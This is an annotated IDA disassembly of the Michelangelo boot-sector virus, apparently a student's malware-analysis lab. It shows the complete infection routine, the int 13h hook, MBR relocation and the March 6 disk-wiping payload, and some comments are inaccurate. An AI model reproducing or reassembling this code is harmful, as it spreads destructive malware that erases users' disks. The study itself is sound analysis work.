seg000:7C00 ;
seg000:7C00 ; +-------------------------------------------------------------------------+
seg000:7C00 ; |      This file was generated by The Interactive Disassembler (IDA)      |
seg000:7C00 ; |           Copyright (c) 2019 Hex-Rays, <support@hex-rays.com>           |
seg000:7C00 ; |                      License info: 48-BABB-7E64-E2                      |
seg000:7C00 ; |                     Georgia Institute of Technology                     |
seg000:7C00 ; +-------------------------------------------------------------------------+
seg000:7C00 ;
seg000:7C00 ; Input SHA256 : B8A70F4A55E3EF8F59363FDF1F6ECD8761F3B8CEF8DB122EB0B2081B8C4CCD0E
seg000:7C00 ; Input MD5    : 3FFC402675E30C6E42560EAA0A90A2B7
seg000:7C00 ; Input CRC32  : 827C7725
seg000:7C00
seg000:7C00 ; ---------------------------------------------------------------------------
seg000:7C00 ; File Name   : /nethome/callotey3/ECE4894/Lab2/michelangelo.1
seg000:7C00 ; Format      : Binary file
seg000:7C00 ; Base Address: 0000h Range: 7C00h - 7E00h Loaded length: 0200h
seg000:7C00
seg000:7C00                 .686p
seg000:7C00                 .mmx
seg000:7C00                 .model flat
seg000:7C00
seg000:7C00 ; ===========================================================================
seg000:7C00
seg000:7C00 ; Segment type: Pure code
seg000:7C00 seg000          segment byte public 'CODE' use16
seg000:7C00                 assume cs:seg000
seg000:7C00                 ;org 7C00h
seg000:7C00                 assume es:nothing, ss:nothing, ds:nothing, fs:nothing, gs:nothing
seg000:7C00                 jmp     start           ; MBR starts here
seg000:7C00 ; ---------------------------------------------------------------------------
seg000:7C03 byte_7C03       db 0F5h                 ; DATA XREF: seg000:7CF0↓r
seg000:7C04                 db 0
seg000:7C05 word_7C05       dw 0                    ; DATA XREF: seg000:7CD8↓w
seg000:7C07                 db 2, 0Eh, 0
seg000:7C0A word_7C0A       dw 9739h                ; DATA XREF: seg000:7CC1↓w
seg000:7C0C word_7C0C       dw 0F000h               ; DATA XREF: seg000:7CC7↓w
seg000:7C0E ; ---------------------------------------------------------------------------
seg000:7C0E                 push    ds              ; redirected disk i/o handler starts here
seg000:7C0F                 push    ax              ; hijacked disk i/o handler argument
seg000:7C10                 or      dl, dl          ; check if dl is 0
seg000:7C12                 jnz     short loc_7C2F  ; dont jumpo if drive A running
seg000:7C14                 xor     ax, ax          ; ax = 0, target drive A
seg000:7C16                 mov     ds, ax          ; ds = 0
seg000:7C18                 test    byte ptr ds:43Fh, 1 ; check to see if a drive motor is running
seg000:7C1D                 jnz     short loc_7C2F  ; jump if drive motor is running (floppy disk inside)
seg000:7C1F                 pop     ax              ; retrieve int 13h argument
seg000:7C20                 pop     ds              ; get original ds value
seg000:7C21                 pushf                   ; push flag ragister onto stack
seg000:7C22                 call    dword ptr cs:0Ah ; call real interrupt 13h,
seg000:7C22                                         ; stored during start section of code
seg000:7C27                 pushf                   ; push flags again after interrupt
seg000:7C28                 call    sub_7C36        ; call malware subroutine
seg000:7C2B                 popf                    ; restore flags
seg000:7C2C                 retf    2               ; return to original int 13 call with return arguments
seg000:7C2F ; ---------------------------------------------------------------------------
seg000:7C2F
seg000:7C2F loc_7C2F:                               ; CODE XREF: seg000:7C12↑j
seg000:7C2F                                         ; seg000:7C1D↑j
seg000:7C2F                 pop     ax
seg000:7C30                 pop     ds
seg000:7C31                 jmp     dword ptr cs:0Ah ; jump to original int 13 handler

							jump rather than call becsue return address is already pushed in innital interrupt call
seg000:7C36
seg000:7C36 ; =============== S U B R O U T I N E =======================================
seg000:7C36
when using int 13h from floppy
seg000:7C36
seg000:7C36 sub_7C36        proc near               ; CODE XREF: seg000:7C28↑p
seg000:7C36                 push    ax              ; push all registers onto stack
seg000:7C37                 push    bx
seg000:7C38                 push    cx
seg000:7C39                 push    dx
seg000:7C3A                 push    ds
seg000:7C3B                 push    es
seg000:7C3C                 push    si
seg000:7C3D                 push    di
seg000:7C3E                 push    cs
seg000:7C3F                 pop     ds              ; pop cs into ds
seg000:7C40                 push    cs
seg000:7C41                 pop     es              ; pop cs into es
seg000:7C42                 mov     si, 4           ; store 4 in si
seg000:7C45
seg000:7C45 subr:                                   ; CODE XREF: sub_7C36+29↓j
seg000:7C45                 mov     ax, 201h        ; ah = 2: read sector from drive
seg000:7C45                                         ; al = 1: read one sector
seg000:7C48                 mov     bx, 200h        ; buffer address ptr = es:512
seg000:7C4B                 mov     cx, 1           ; cx = 1 -> cylinder 0 sector 1
seg000:7C4E                 xor     dx, dx          ; dx = 0 -> head 0 drive 0 (floppy disk A)
seg000:7C50                 pushf
seg000:7C51                 call    dword ptr ds:0Ah ; call original int 13h with above arguments
seg000:7C55                 jnb     short loc_7C63  ; jump if no error
seg000:7C57                 xor     ax, ax          ; on error, set ax to 0
seg000:7C59                 pushf
seg000:7C5A                 call    dword ptr ds:0Ah ; reset disk after error
seg000:7C5E                 dec     si              ; try next sector
seg000:7C5F                 jnz     short subr      ; CALLS subr again and tries on next sector
seg000:7C61                 jmp     short return    ; if error on every sector, jump to return
seg000:7C63 ; ---------------------------------------------------------------------------
seg000:7C63
seg000:7C63 loc_7C63:                               ; CODE XREF: sub_7C36+1F↑j
seg000:7C63                 xor     si, si          ; clear si
seg000:7C65                 cld                     ; clear direction flag,incremental memory
seg000:7C66                 lodsw                   ; take value from ds:si and put into ax, increment si by 1
seg000:7C67                 cmp     ax, [bx]        ; compare es:di to address stored in bx
seg000:7C69                 jnz     short loc_7C71  ; if not the same, jump
seg000:7C6B                 lodsw                   ; take value from ds:si and put into ax, increment si by 1
seg000:7C6C                 cmp     ax, [bx+2]      ; compare to bx address offset 2 bytes
seg000:7C6F                 jz      short return    ; if same jump to return
seg000:7C71
seg000:7C71 loc_7C71:                               ; CODE XREF: sub_7C36+33↑j
seg000:7C71                 mov     ax, 301h        ; write 1 sector to drive
seg000:7C74                 mov     dh, 1           ; head 1
seg000:7C76                 mov     cl, 3           ; sector 3
seg000:7C78                 cmp     byte ptr [bx+15h], 0FDh ; compare value stored at address bx offset 21 to constant
seg000:7C7C                 jz      short loc_7C80  ; if same skip next instruction
seg000:7C7E                 mov     cl, 0Eh         ; otherwise update cl argument to sector 14
seg000:7C80
seg000:7C80 loc_7C80:                               ; CODE XREF: sub_7C36+46↑j
seg000:7C80                 mov     ds:8, cx        ; store cx in ds:8 to indicate current sector
seg000:7C84                 pushf                   ; push flags again
seg000:7C85                 call    dword ptr ds:0Ah ; call int 13h with above arguments
seg000:7C89                 jb      short return    ; jump if error
seg000:7C8B                 mov     si, 3BEh        ; argument for movsw
seg000:7C8E                 mov     di, 1BEh        ; argument for movsw
seg000:7C91                 mov     cx, 21h ; '!'   ; block size of 33 words
seg000:7C94                 cld                     ; clear direction flag
seg000:7C95                 rep movsw               ; copy memory from from ds:si(MBR backup) to es:di (original MBR location) with incrementing memory,
seg000:7C95                                         ; this copies partition table and signature from MBR to virus
seg000:7C97                 mov     ax, 301h        ; write 1 sector to drive
seg000:7C9A                 xor     bx, bx          ; bx = 0
seg000:7C9C                 mov     cx, 1           ; sector 1
seg000:7C9F                 xor     dx, dx          ; head 0 floppy disk A
seg000:7CA1                 pushf                   ; push flags
seg000:7CA2                 call    dword ptr ds:0Ah
seg000:7CA6
seg000:7CA6 return:                                 ; CODE XREF: sub_7C36+2B↑j
seg000:7CA6                                         ; sub_7C36+39↑j ...
seg000:7CA6                 pop     di
seg000:7CA7                 pop     si
seg000:7CA8                 pop     es
seg000:7CA9                 pop     ds
seg000:7CAA                 pop     dx
seg000:7CAB                 pop     cx
seg000:7CAC                 pop     bx
seg000:7CAD                 pop     ax
seg000:7CAE                 retn                    ; end of procedure
seg000:7CAE sub_7C36        endp
seg000:7CAE
seg000:7CAF ; ---------------------------------------------------------------------------
seg000:7CAF  Once virus initiates, control is passed to the uninfected code to continue booting, virus maintains presence through int 13h handler
seg000:7CAF start:                                  ; CODE XREF: seg000:7C00↑j
seg000:7CAF                 xor     ax, ax          ; Beginning of code/put 0 in ax
seg000:7CB1                 mov     ds, ax          ; set data segment register to 0
seg000:7CB3                 cli                     ; clear interrupt flag
seg000:7CB4                 mov     ss, ax          ; set stack segment register to 0 delay interrupt 1 instruction
seg000:7CB6                 mov     ax, 7C00h       ; set ax to starting address of MBR
seg000:7CB9                 mov     sp, ax          ; set stack ptr to MBR address
seg000:7CBB                 sti                     ; set interrupt flag so hardware interrupts can begin
seg000:7CBC                 push    ds              ; push data segment register onto stack
seg000:7CBD                 push    ax              ; push starting address onto stack
seg000:7CBE                 mov     ax, ds:4Ch      ; get address ds:4C (int 13h handler vector)
seg000:7CC1                 mov     ds:word_7C0A, ax ; store address ds:0x4C at ds offset 0x9739 (2k below MBR section)
seg000:7CC4                 mov     ax, ds:4Eh
seg000:7CC7                 mov     ds:word_7C0C, ax ; store ds:0x4E at ROM BIOS memory segment(ds offset 0xF000) to change MBR
seg000:7CCA                 mov     ax, ds:413h     ; get memory size in kb (data segment value) in ax
seg000:7CCD                 dec     ax
seg000:7CCE                 dec     ax
seg000:7CCF                 mov     ds:413h, ax     ; replace with memory size decremented by 2 kb
seg000:7CD2                 mov     cl, 6
seg000:7CD4                 shl     ax, cl          ; making space, (mem - 2kb) * 64, transforms into 16-bit segment value

													(ax * 2**10) = segemnt * 2 **4
													segemnt = (ax * 2 ** 10)/2**4 = ax * 2**6, so shl is appropriate to get segemnt

seg000:7CD6                 mov     es, ax          ; es points to new block below memory limit
seg000:7CD8                 mov     ds:word_7C05, ax ; store location of es at start of ds,
seg000:7CD8                                         ; replaces div by 0 interrupt
seg000:7CDB                 mov     ax, 0Eh         ; store value 14 in ax
seg000:7CDE                 mov     ds:4Ch, ax      ; ds offset 0x4C holds 0x0E,
seg000:7CDE                                         ; old value stored previously
seg000:7CE1                 mov     word ptr ds:4Eh, es ; ds offset 0x4E holds ptr to block below memory
seg000:7CE5                 mov     cx, 1BEh        ; block size for memoy copying is 446 bytes,
seg000:7CE5                                         ; size of code area
seg000:7CE8                 mov     si, 7C00h       ; set movs argument
seg000:7CEB                 xor     di, di          ; set movs argument
seg000:7CED                 cld                     ; clear direction flag, data goes onwards rather than backwards
seg000:7CEE                 rep movsb               ; copy memory from from ds:si(virus MBR) to
seg000:7CEE                                         ; es:di(beyond memory limit) with incrementing memory,
seg000:7CEE                                         ; this copies the virus below memory limit
													rep movsb decrements cx as it copies (DOS-7 clue!!!)
seg000:7CF0                 jmp     dword ptr cs:byte_7C03 ; jump to addr stored at code segment offset 0xF5(offset 7CF0)
seg000:7CF0                                         ; run next line at high copy of virus
														dynamic jump to high memory
seg000:7CF5 ; ---------------------------------------------------------------------------
seg000:7CF5                 xor     ax, ax          ; continues from directly above, but this code is located in high memory block
seg000:7CF7                 mov     es, ax          ; set es segment register to 0
seg000:7CF9                 int     13h             ; DISK - RESET DISK SYSTEM
seg000:7CF9                                         ; DL = drive (if bit 7 is set both hard disks and floppy disks reset)
seg000:7CFB                 push    cs              ; push address 0x0 onto stack
seg000:7CFC                 pop     ds              ; ds now starts at 0x0
seg000:7CFD                 mov     ax, 201h        ; read one sector to check for infection
seg000:7D00                 mov     bx, 7C00h       ; destination is 7C00h beyond virus code
seg000:7D03                 mov     cx, ds:8
seg000:7D07                 cmp     cx, 7           ; if ds:8 != 7 jump
seg000:7D07                                         ; (if ds:8 = 7 then the disk is already infected)
seg000:7D0A                 jnz     short jump1
seg000:7D0C                 mov     dx, 80h         ; otherwise target first hard drive and read disk track 0 sector 7, location of MBR backup on hard drive, overwrite virus
seg000:7D0F                 int     13h             ; DISK - READ SECTORS INTO MEMORY
seg000:7D0F                                         ; AL = number of sectors to read, CH = track, CL = sector
seg000:7D0F                                         ; DH = head, DL = drive, ES:BX -> buffer to fill
seg000:7D0F                                         ; Return: CF set on error, AH = status, AL = number of sectors read
seg000:7D11                 jmp     short check_date
seg000:7D13 ; ---------------------------------------------------------------------------
seg000:7D13
seg000:7D13 jump1:                                  ; CODE XREF: seg000:7D0A↑j
seg000:7D13                 mov     cx, ds:8        ; cx holds location of MBR in disk
seg000:7D17                 mov     dx, 100h        ; head 1 drive 0 (floppy disk 1)
seg000:7D1A                 int     13h             ; DISK - read sectors from drive
seg000:7D1C                 jb      short check_date ; jump if no error
seg000:7D1E                 push    cs              ; store cs value on stack
seg000:7D1F                 pop     es              ; es = cs = 0
seg000:7D20                 mov     ax, 201h        ; read one sector
seg000:7D23                 mov     bx, 200h        ; 512 byte buffer
seg000:7D26                 mov     cx, 1           ; track 0 sector 1
seg000:7D29                 mov     dx, 80h         ; target first hard drive
seg000:7D2C                 int     13h             ; DISK - READ SECTORS INTO MEMORY
seg000:7D2C                                         ; AL = number of sectors to read, CH = track, CL = sector
seg000:7D2C                                         ; DH = head, DL = drive, ES:BX -> buffer to fill
seg000:7D2C                                         ; Return: CF set on error, AH = status, AL = number of sectors read
seg000:7D2C                                         ; this gets the MBR from hard drive sector 1 into memory
seg000:7D2E                 jb      short check_date ; jump if no error
seg000:7D30                 xor     si, si          ; si holds 0
seg000:7D32                 cld                     ; direction set to forward
seg000:7D33                 lodsw                   ; take value from es:di and put into ax
seg000:7D34                 cmp     ax, [bx]        ; compare es:di to bx address (512 beyond virus code)
seg000:7D36                 jnz     short write_to_disk
seg000:7D38                 lodsw                   ; take value from es:di and put into ax
seg000:7D39                 cmp     ax, [bx+2]      ; compare es:di to value held at bx address offset 2
seg000:7D3C                 jnz     short write_to_disk
seg000:7D3E
seg000:7D3E check_date:                             ; CODE XREF: seg000:7D11↑j
seg000:7D3E                                         ; seg000:7D1C↑j ...
seg000:7D3E                 xor     cx, cx
seg000:7D40                 mov     ah, 4
seg000:7D42                 int     1Ah             ; CLOCK - READ DATE FROM REAL TIME CLOCK (AT,XT286,CONV,PS)
seg000:7D42                                         ; Return: DL = day in BCD
seg000:7D42                                         ; DH = month in BCD
seg000:7D42                                         ; CL = year in BCD
seg000:7D42                                         ; CH = century (19h or 20h)
seg000:7D44                 cmp     dx, 306h        ; compare date to March 6th, Michaelangelo's Bday
seg000:7D48                 jz      short if_bday   ; if birthday, go to jump
seg000:7D4A                 retf                    ; return to boot procedure(presumably)
seg000:7D4B ; ---------------------------------------------------------------------------
seg000:7D4B
seg000:7D4B if_bday:                                ; CODE XREF: seg000:7D48↑j
seg000:7D4B                 xor     dx, dx          ; following code only runs on desired date
seg000:7D4D                 mov     cx, 1           ; if bday dx will be 0 and cx will be 1.
seg000:7D50
seg000:7D50 check_progress:                         ; CODE XREF: seg000:7D7F↓j
seg000:7D50                                         ; seg000:7D85↓j
seg000:7D50                 mov     ax, 309h        ; set first int 13h argument, writitng 9 sectors to drive
seg000:7D53                 mov     si, ds:8        ; check virus progress
seg000:7D57                 cmp     si, 3           ; checking disk vs hard drive for backup MBR,
seg000:7D57                                         ; 3 means that MBR backup is still on floppy disk
seg000:7D5A                 jz      short overwrite_mem
seg000:7D5C                 mov     al, 0Eh         ; write to 14 sectors
seg000:7D5E                 cmp     si, 0Eh         ; change based on previous comparison
seg000:7D61                 jz      short overwrite_mem
seg000:7D63                 mov     dl, 80h         ; target first hard disk
seg000:7D65                 mov     byte ptr ds:7, 4 ; change ds:7 to 4, referenced in different part of code
seg000:7D6A                 mov     al, 11h         ; write to 17 sectors
seg000:7D6C
seg000:7D6C overwrite_mem:                          ; CODE XREF: seg000:7D5A↑j
seg000:7D6C                                         ; seg000:7D61↑j
seg000:7D6C                 mov     bx, 5000h       ; store 20480 in bx
seg000:7D6F                 mov     es, bx          ; create huge buffer, target either 9 sectors on floppy disk,
seg000:7D6F                                         ; 14 sectors on floppy disk, or 17 sectors on hard drive
seg000:7D71                 assume es:nothing
seg000:7D71                 int     13h             ; DISK - WRITE SECTORS FROM MEMORY
seg000:7D71                                         ; AL = number of sectors to write, CH = track, CL = sector
seg000:7D71                                         ; DH = head, DL = drive, ES:BX -> buffer
seg000:7D71                                         ; Return: CF set on error, AH = status, AL = number of sectors written
seg000:7D73                 jnb     short inc_loop  ; continue loop if no error
seg000:7D75                 xor     ah, ah          ; once all memory is overwritten system "restarts"
seg000:7D77                 int     13h             ; DISK - RESET DISK SYSTEM
seg000:7D77                                         ; DL = drive (if bit 7 is set both hard disks and floppy disks reset)
seg000:7D79
seg000:7D79 inc_loop:                               ; CODE XREF: seg000:7D73↑j
seg000:7D79                 inc     dh              ; count up from 0
seg000:7D7B                 cmp     dh, ds:7        ; count up to 4 (established earlier in code)
seg000:7D7F                 jb      short check_progress
seg000:7D81                 xor     dh, dh          ; reset to head 0
seg000:7D83                 inc     ch              ; repeat for next cylinder
seg000:7D85                 jmp     short check_progress
seg000:7D87 ; ---------------------------------------------------------------------------
seg000:7D87
seg000:7D87 write_to_disk:                          ; CODE XREF: seg000:7D36↑j
seg000:7D87                                         ; seg000:7D3C↑j
seg000:7D87                 mov     cx, 7           ; track 0 sector 7
seg000:7D8A                 mov     ds:8, cx        ; put 7 at ds:8 after copying MBR to sector 7 of hard drive
seg000:7D8E                 mov     ax, 301h        ; write to one disk sector
seg000:7D91                 mov     dx, 80h         ; target first hard drive
seg000:7D94                 int     13h             ; DISK - WRITE SECTORS FROM MEMORY
seg000:7D94                                         ; AL = number of sectors to write, CH = track, CL = sector
seg000:7D94                                         ; DH = head, DL = drive, ES:BX -> buffer
seg000:7D94                                         ; Return: CF set on error, AH = status, AL = number of sectors written
seg000:7D96                 jb      short check_date
seg000:7D98                 mov     si, 3BEh        ; 512 offset from virus code
seg000:7D9B                 mov     di, 1BEh        ; start of master partition table in MBR
seg000:7D9E                 mov     cx, 21h ; '!'   ; block size for memory copying is 33 words/66 bytes
seg000:7DA1                 rep movsw               ; copy memory from from ds:si(MBR backup below virus) to es:di (virus) with incrementing memory,
seg000:7DA1                                         ; this gets the legitimate master partition table and signature
seg000:7DA1                                         ; from the MBR and puts into the virus memory
seg000:7DA3                 mov     ax, 301h        ; write to one sector
seg000:7DA6                 xor     bx, bx          ; buffer = es:0
													cl is 0 after rep movsb, so track 0 sector 1
seg000:7DA8                 inc     cl              ; cx = 22h, track 0 sector 34
seg000:7DAA                 int     13h             ; DISK - WRITE SECTORS FROM MEMORY
seg000:7DAA                                         ; AL = number of sectors to write, CH = track, CL = sector
seg000:7DAA                                         ; DH = head, DL = drive, ES:BX -> buffer
seg000:7DAA                                         ; Return: CF set on error, AH = status, AL = number of sectors written
seg000:7DAA                                         ; write "perfected" virus to hard drive sector 1
seg000:7DAA                                         ; note that ds:8 = 7
seg000:7DAC                 jmp     short check_date
seg000:7DAC ; ---------------------------------------------------------------------------
seg000:7DAE                 db 50h dup(0), 55h, 0AAh
seg000:7DAE seg000          ends
seg000:7DAE
seg000:7DAE
seg000:7DAE                 end
